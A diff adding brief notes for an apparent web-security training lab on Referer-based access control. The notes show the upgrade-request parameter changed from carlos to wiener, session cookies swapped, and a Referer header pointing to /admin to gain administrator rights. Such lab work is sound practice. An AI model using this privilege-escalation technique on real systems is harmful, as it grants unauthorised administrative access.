@@ -1,0 +1,17 @@
+Lab #13: Referer-based access control
+
+End goal:
+- log in as wiener
+- promote to administrator
+
+Analysis:
+
+username=carlos&action=upgrade
+--> username=wiener&action=upgrade
+
+admin cookieid=BtqVNHvqvxP1jp43sT4PxSx2BjQXUN38
+--> wiener cookieid=EA3ozsQlWTCkWHhmugMOXjgPrNJzmG8
+
+Referer: https://0a76003b03e9ebc78352461800480010.web-security-academy.net/admin
+-> already refer to admin
+
